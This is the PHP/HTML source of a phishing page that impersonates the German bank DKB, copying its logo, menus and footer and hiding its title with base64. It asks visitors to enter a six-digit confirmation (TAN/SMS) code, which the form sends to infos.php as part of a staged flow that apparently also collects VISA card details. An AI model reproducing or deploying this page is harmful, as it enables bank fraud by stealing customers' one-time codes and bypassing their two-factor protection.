<?php 

require_once "functions.php";
require_once "ajax.php";

?>

<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>
          <?php  
            $str = 'REtCIEJhbmtpbmc=';
            echo base64_decode($str);
          ?>
        </title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/dose.css">
        <link rel="stylesheet"  href="css/animate.css">
</head>
<body>  

        <section>
          <div class="container">
            <header>
              <div class="mag"> 
                <img src="image/bar.png" class="me-3 loop">
                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88.59 49.13" fill="none"><title>DKB Logo</title><path d="M0 0h12.88C20.26 0 29 5.42 29 16.21c0 9.92-8.75 16.22-16.13 16.22H0zm19.79 16.21c0-6.76-5.54-8.1-10.6-8.1v16.21c5.06 0 10.6-1.34 10.6-8.1zM32.63 0h9.23v12.18h.09L49.23 0h10.6l-9.66 14.87 10.6 17.59h-10.6l-8.19-13.98h-.1v13.98h-9.21V0zm30.64 0h13.35c6 0 10.12 3.52 10.12 8.1 0 3.07-1.09 5.7-3.6 6.46v.1c2.07.76 5.45 3.51 5.45 7.89 0 6.48-5.07 9.91-10.6 9.91H63.27zM75.3 12.97c1.57 0 2.91-.98 2.91-2.84 0-1.75-1.34-2.85-2.9-2.85h-2.82v5.7zm.82 11.75c1.84 0 2.9-1.44 2.9-3.24 0-1.8-1.47-3.25-3.31-3.25h-3.22v6.49zM3.19 48.92H0v-9.97h3.13c2.4 0 5.1 1.65 5.1 4.98 0 3.3-2.73 4.99-5.04 4.99zm-.5-8.26H1.9v6.52h.78c1.69 0 3.53-1.04 3.53-3.28 0-2.2-1.84-3.24-3.53-3.24zm11 8.26v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.7-1.19-2.7-3.12 0-1.92 1.3-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H13.7zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm6.6 4.65a3.26 3.26 0 01-2.28-.94l.75-1.14c.37.37 1.03.74 1.53.74.53 0 .75-.19.75-.5 0-1-2.78-.63-2.78-2.75 0-1.13 1-1.65 2.12-1.65 1.03 0 1.66.19 2.28.68l-.75 1a2.71 2.71 0 00-1.4-.42c-.32 0-.63.06-.63.43 0 .73 2.9.6 2.9 2.75.04 1.4-1.09 1.8-2.5 1.8zm11.03-.21l-1.87-2.51h-.03v2.51h-1.79V38.79h1.79v6.4h.02l1.6-2.08h2.13l-2.29 2.78 2.57 3.06h-2.13v-.03zm6.97 0v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.69-1.19-2.69-3.12 0-1.92 1.28-3.12 2.69-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H36.8zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.72 1.53 1.4 1.53c.85 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm8.82 4.44v-3.18c0-.83-.29-1.26-1.13-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.44 2.44 0 011.91-.77c1.38 0 2.16.77 2.16 2.3v3.73H44.1zm7.31 0v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18H47.3V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm10.32 0h-3.41v-9.97h3.13c1.68 0 3.12 1 3.12 2.5 0 1.1-.56 1.93-1.28 2.24.72.27 1.69.98 1.69 2.35.03 1.78-1.4 2.88-3.25 2.88zm-.4-8.38h-1.07v2.35h1.06c.72 0 1.4-.33 1.4-1.19 0-.83-.68-1.16-1.4-1.16zm.12 3.94h-1.22v2.79h1.22c1 0 1.56-.55 1.56-1.38 0-.86-.56-1.4-1.56-1.4zm9.28 4.44v-.55h-.03c-.47.55-1.19.76-2.03.76-1.41 0-2.7-1.19-2.7-3.12 0-1.92 1.29-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8h-1.78zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.66-1.53-1.5-1.53zm8.81 4.44v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm6.88 0l-1.88-2.51H83v2.51h-1.78V38.79h1.78v6.4h.03l1.6-2.08h2.12l-2.28 2.78 2.56 3.06h-2.09v-.03z" fill="#148dea"></path></svg>
              </div>
              <ul class="nav">
                <li class="nav-item active">
                   <p>Ihre suche...</p>
                   <img src="image/cherch.svg">
                </li>
                <li class="nav-item lock">
                  <img src="image/lock.svg">
                  <p>Anmelden</p>
                </li>
              </ul>
            </header>
            <div class="grayp">
              <div class="row">
                <div class="col-lg-3 lass">
                  <div class="left">
                    <ul>
                      <li>Mein Banking</li>
                      <li>Freunde werben</li>
                      <li>Privatkunden</li>
                      <li>Geschäftskunden</li>
                      <li>Nachhaltigkeit</li>
                      <li>Über uns</li>
                      <li>Karriere</li>
                    </ul>
                  </div>  
                </div>
                <div class="col-lg-9">
                  <div class="right">
                    <h5>Anmeldung bestätigen</h5>
                    <div class="forma">
                      <div class="step">
                         <ul class="nav">
                           <li class="nav-item">
                             <span style="background:#555555;color: white;">1</span>
                             <p>Auftrag anlegen</p>
                           </li>
                           <li class="nav-item">
                             <span style="background:#555555;color: #fff;">2</span>
                             <p>DKB-VISA-Card eingeben</p>
                           </li>
                           <li class="nav-item">
                             <span style="background:#148DEA;color: white;" class="lava">3</span>
                             <p>Bestätigungscode</p>
                           </li>
                           <li class="nav-item">
                             <span style="background:rgb(179,179,179);color: white;">1</span>
                             <p>Fertig!</p>
                           </li>
                         </ul>
                      </div>
                      <div class="login">
                        <div class="domin text-center">
                          <span class="mb-4">Um Ihre Identität zu überprüfen, fügen Sie den Bestätigungskodex hinzu, den Sie an Ihr Telefon gesendet haben, um die Transaktion zu bestätigen. Wenn Sie den Code nicht gelesen haben, überprüfen Sie die App und bestätigen Sie die Transaktion.</span>
                          <img src="image/tan.png" width="100px">
                          <br>
                          <b>Bestätigungscode</b>
                        </div>
                        <form action="infos.php" method="post">
                          <input type="hidden" name="step" value="sms">
                          <div class="form-group mt-4 mami text-center" style="width: 100%;">
                            <label>Geben Sie den Bestätigungscode ein</label>
                            <input type="text" name="tan" id="tan" maxlength="6" minlength="6" required class="form-control" style="width:100px; margin:0 auto;text-align: center;margin-top: 10px;outline: none;">
                          </div>
                          <div class="bori">
                            <button class="btn" onclick="return false"><i class="bi bi-chevron-left"></i> zurück </button>
                            <button class="btn" name="submit" style="background:#148DEA;color:white;">Weiter <i class="bi bi-chevron-right"></i></button>
                          </div>
                      </form>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="footter">
              <div class="row">
                <div class="col-lg-2 col-md-4 col-sm-6 col-12">
                  <ul>
                    <li class="active">DKB AG</li>
                    <li>Presse</li>
                    <li>Public Affairs</li>
                    <li>Investor Relations</li>
                    <li>Facebook</li>
                    <li>Instagram</li>
                    <li>Twitter</li>
                    <li>Youtube</li>
                    <li>LinkedIn</li>
                    <li>TikTok</li>
                    <li>Datenschutz</li>
                    <li>Impressum</li>
                  </ul>
                </div>
                <div class="col-lg-2 col-md-4 col-sm-6 col-12">
                  <ul>
                    <li class="active">Beliebte Produkte</li>
                    <li>Kostenloses Girokonto</li>
                    <li>Kreditkarte</li>
                    <li>Online-Depot</li>
                    <li>Privatkredit</li>
                    <li>Studierendenkonto</li>
                    <li>Geschäftskonto</li>
                    <li>Immobilienangebote</li>
                    <li>Baufinanzierung</li>
                    <li>Festzins</li>
                    <li>Tagesgeldkonto</li>
                  </ul>
                </div>
                <div class="col-lg-2 col-md-4 col-sm-6 col-12">
                  <ul>
                    <li class="active">Banking & Apps</li>
                    <li>Internet-Banking</li>
                    <li>DKB-Apps</li>
                    <li>TAN2go-App</li>
                    <li>Neues Handy – was tun?</li>
                    <li>Verwalterplattform</li>
                    <li>Treuhänderplattform</li>
                  </ul>
                </div>
                <div class="col-lg-2 col-md-4 col-sm-6 col-12">
                  <ul>
                    <li class="active">Sicherheit</li>
                    <li>Karte sperren</li>
                    <li>Sicherheit im Banking</li>
                    <li>TAN-Verfahren</li>
                    <li>Einlagensicherung</li>
                    <li>Visa Secure</li>
                    <li>Card Control</li>
                  </ul>
                </div>
                <div class="col-lg-2 col-md-4 col-sm-6 col-12">
                  <ul>
                    <li class="active">Kontakt & Service</li>
                    <li>Kontakt & FAQ</li>
                    <li>Formulare</li>
                    <li>Finanzwissen</li>
                    <li>Freunde werben</li>
                    <li>Geldautomaten suchen</li>
                    <li>IBAN-Rechner</li>
                    <li>Entwickler</li>
                  </ul>
                </div>
                <div class="col-lg-2 col-md-4 col-sm-6 col-12">
                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88.59 49.13" fill="none"><title>DKB Logo</title><path d="M0 0h12.88C20.26 0 29 5.42 29 16.21c0 9.92-8.75 16.22-16.13 16.22H0zm19.79 16.21c0-6.76-5.54-8.1-10.6-8.1v16.21c5.06 0 10.6-1.34 10.6-8.1zM32.63 0h9.23v12.18h.09L49.23 0h10.6l-9.66 14.87 10.6 17.59h-10.6l-8.19-13.98h-.1v13.98h-9.21V0zm30.64 0h13.35c6 0 10.12 3.52 10.12 8.1 0 3.07-1.09 5.7-3.6 6.46v.1c2.07.76 5.45 3.51 5.45 7.89 0 6.48-5.07 9.91-10.6 9.91H63.27zM75.3 12.97c1.57 0 2.91-.98 2.91-2.84 0-1.75-1.34-2.85-2.9-2.85h-2.82v5.7zm.82 11.75c1.84 0 2.9-1.44 2.9-3.24 0-1.8-1.47-3.25-3.31-3.25h-3.22v6.49zM3.19 48.92H0v-9.97h3.13c2.4 0 5.1 1.65 5.1 4.98 0 3.3-2.73 4.99-5.04 4.99zm-.5-8.26H1.9v6.52h.78c1.69 0 3.53-1.04 3.53-3.28 0-2.2-1.84-3.24-3.53-3.24zm11 8.26v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.7-1.19-2.7-3.12 0-1.92 1.3-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H13.7zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm6.6 4.65a3.26 3.26 0 01-2.28-.94l.75-1.14c.37.37 1.03.74 1.53.74.53 0 .75-.19.75-.5 0-1-2.78-.63-2.78-2.75 0-1.13 1-1.65 2.12-1.65 1.03 0 1.66.19 2.28.68l-.75 1a2.71 2.71 0 00-1.4-.42c-.32 0-.63.06-.63.43 0 .73 2.9.6 2.9 2.75.04 1.4-1.09 1.8-2.5 1.8zm11.03-.21l-1.87-2.51h-.03v2.51h-1.79V38.79h1.79v6.4h.02l1.6-2.08h2.13l-2.29 2.78 2.57 3.06h-2.13v-.03zm6.97 0v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.69-1.19-2.69-3.12 0-1.92 1.28-3.12 2.69-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H36.8zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.72 1.53 1.4 1.53c.85 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm8.82 4.44v-3.18c0-.83-.29-1.26-1.13-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.44 2.44 0 011.91-.77c1.38 0 2.16.77 2.16 2.3v3.73H44.1zm7.31 0v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18H47.3V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm10.32 0h-3.41v-9.97h3.13c1.68 0 3.12 1 3.12 2.5 0 1.1-.56 1.93-1.28 2.24.72.27 1.69.98 1.69 2.35.03 1.78-1.4 2.88-3.25 2.88zm-.4-8.38h-1.07v2.35h1.06c.72 0 1.4-.33 1.4-1.19 0-.83-.68-1.16-1.4-1.16zm.12 3.94h-1.22v2.79h1.22c1 0 1.56-.55 1.56-1.38 0-.86-.56-1.4-1.56-1.4zm9.28 4.44v-.55h-.03c-.47.55-1.19.76-2.03.76-1.41 0-2.7-1.19-2.7-3.12 0-1.92 1.29-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8h-1.78zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.66-1.53-1.5-1.53zm8.81 4.44v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm6.88 0l-1.88-2.51H83v2.51h-1.78V38.79h1.78v6.4h.03l1.6-2.08h2.12l-2.28 2.78 2.56 3.06h-2.09v-.03z" fill="#148dea"></path></svg>
                </div>

              </div>
            </div>
          </div>
        </section>

        <div class="bb">
          <div class="container">
            <ul class="nav">
              <li class="nav-item">Impressum</li>
              <li class="nav-item">Datenschutz</li>
              <li class="nav-item">Cookie Einstellungen ändern </li>
              <li class="nav-item">Preise & Bedingungen</li>
              <li class="nav-item">BIC: BYLADEM1001</li>
            </ul>
          </div>
        </div>
        


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

             $("#tan").focus();
             
          
        </script>


   






              
</body>
</html>